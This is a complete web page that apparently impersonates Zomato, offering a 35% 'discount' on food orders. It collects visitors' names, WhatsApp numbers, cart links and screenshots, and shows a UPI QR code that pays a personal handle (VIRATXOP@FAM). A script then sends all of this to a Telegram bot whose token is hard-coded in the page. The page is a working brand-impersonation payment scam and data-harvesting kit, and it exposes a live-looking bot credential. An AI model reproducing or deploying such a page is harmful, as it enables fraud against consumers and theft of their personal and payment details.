<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zomato - Order Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --zomato-red: #E23744; }
        .bg-zomato { background-color: var(--zomato-red); }
        .hidden { display: none; }
    </style>
</head>
<body class="bg-gray-50 font-sans">

    <audio id="clickSound" src="https://www.soundjay.com/buttons/sounds/button-16.mp3"></audio>

    <nav class="bg-white p-4 sticky top-0 z-50 shadow-sm text-center">
        <img src="https://b.zmtcdn.com/web_assets/b40b97e677bc7b2ca77c58c61db266fe1603954218.png" class="w-20 mx-auto">
    </nav>

    <div class="max-w-md mx-auto p-4 mb-10">
        <div id="step-1" class="section mt-4">
            <h2 class="text-xl font-bold mb-4">Aapki Details</h2>
            <div class="bg-white p-6 rounded-2xl shadow-sm space-y-4 border">
                <input type="text" id="name" class="w-full p-4 border rounded-xl outline-none" placeholder="Enter Full Name">
                <input type="tel" id="whatsapp" class="w-full p-4 border rounded-xl outline-none" placeholder="WhatsApp Number">
                <button onclick="nextStep(2)" class="bg-zomato text-white w-full py-4 rounded-xl font-bold">NEXT</button>
            </div>
        </div>

        <div id="step-2" class="section hidden mt-4">
            <h2 class="text-xl font-bold mb-4">Cart Info</h2>
            <div class="bg-white p-6 rounded-2xl shadow-sm space-y-4 border">
                <input type="url" id="cart_link" class="w-full p-4 border rounded-xl outline-none" placeholder="Paste Zomato Cart Link">
                <p class="text-[10px] font-bold text-gray-400 uppercase">Cart Screenshot Upload Karein</p>
                <input type="file" id="cart_img" accept="image/*" class="w-full p-2 border-2 border-dashed rounded-xl">
                <input type="number" id="cart_value" class="w-full p-4 border rounded-xl font-bold" placeholder="Cart Total Value (â‚¹)">
                <button onclick="calculate()" class="bg-zomato text-white w-full py-4 rounded-xl font-bold">CALCULATE DISCOUNT</button>
            </div>
        </div>

        <div id="step-3" class="section hidden mt-4 text-center">
            <div class="bg-green-600 text-white p-3 rounded-xl mb-4 font-bold">Final Payable: â‚¹<span id="pay_amt">0</span></div>
            <div class="bg-white p-4 inline-block rounded-2xl shadow-md border mb-4">
                <img id="qr_code" class="w-48 h-48 mx-auto">
                <p class="mt-2 font-mono font-bold text-xs">VIRATXOP@FAM</p>
            </div>
            <div class="bg-white p-6 rounded-2xl shadow-sm text-left space-y-4 border">
                <p class="text-[10px] font-bold text-gray-400 uppercase">Payment Screenshot Upload Karein</p>
                <input type="file" id="pay_img" accept="image/*" class="w-full p-2 border-2 border-dashed rounded-xl">
                <input type="text" id="utr" class="w-full p-4 border rounded-xl outline-none" placeholder="Transaction ID / UTR">
                <button id="final-btn" onclick="submitFinalData()" class="bg-black text-white w-full py-4 rounded-xl font-bold">SUBMIT ORDER</button>
            </div>
        </div>

        <div id="step-4" class="section hidden text-center pt-10">
            <div class="bg-white p-8 rounded-2xl shadow-lg border">
                <i class="fa-solid fa-circle-check text-green-500 text-6xl mb-4"></i>
                <h2 class="text-2xl font-black mb-2">Order Sent!</h2>
                <p class="text-sm text-gray-500 mb-8 font-bold">Order ID: <span id="oid"></span></p>
                <a href="https://wa.me/918770959252?text=hi" class="bg-green-500 text-white w-full block py-4 rounded-xl font-bold shadow-lg">CONFIRM ON WHATSAPP</a>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "7381284661:AAGL3R7TWg08GF461MJjJREoR5431SEqDR4";
        const CHAT_ID = "5756664465";
        let finalPay = 0;
        let orderID = "";

        function play() { document.getElementById('clickSound').play(); }

        function nextStep(s) { 
            play();
            document.querySelectorAll('.section').forEach(x => x.classList.add('hidden'));
            document.getElementById('step-' + s).classList.remove('hidden');
            window.scrollTo(0,0);
        }

        function calculate() {
            const val = document.getElementById('cart_value').value;
            if(!val) return alert("Value dalein");
            finalPay = (val - (val * 0.35)).toFixed(2);
            orderID = Math.floor(100000 + Math.random() * 900000);
            document.getElementById('pay_amt').innerText = finalPay;
            const upi = `upi://pay?pa=VIRATXOP@FAM&pn=Zomato&am=${finalPay}&cu=INR`;
            document.getElementById('qr_code').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upi)}`;
            nextStep(3);
        }

        async function submitFinalData() {
            const btn = document.getElementById('final-btn');
            btn.innerText = "Processing... Please Wait";
            btn.disabled = true;

            const name = document.getElementById('name').value;
            const phone = document.getElementById('whatsapp').value;
            const link = document.getElementById('cart_link').value;
            const utr = document.getElementById('utr').value;
            const orig = document.getElementById('cart_value').value;

            // 1. Text Message (With Link)
            const text = `ðŸš€ *NEW ZOMATO ORDER*%0A%0A*ID:* %23${orderID}%0A*Name:* ${name}%0A*WhatsApp:* ${phone}%0A*Cart Link:* ${link}%0A*Original:* â‚¹${orig}%0A*Paid:* â‚¹${finalPay}%0A*UTR:* ${utr}`;
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}&parse_mode=Markdown`);

            // 2. Upload Cart Image
            const cartImg = document.getElementById('cart_img').files[0];
            if(cartImg) {
                const fd1 = new FormData();
                fd1.append('chat_id', CHAT_ID);
                fd1.append('photo', cartImg);
                fd1.append('caption', `Cart Image for #${orderID}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd1 });
            }

            // 3. Upload Payment Image
            const payImg = document.getElementById('pay_img').files[0];
            if(payImg) {
                const fd2 = new FormData();
                fd2.append('chat_id', CHAT_ID);
                fd2.append('photo', payImg);
                fd2.append('caption', `Payment Image for #${orderID}`);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd2 });
            }

            document.getElementById('oid').innerText = "#" + orderID;
            nextStep(4);
        }
    </script>
</body>
    </html>
    
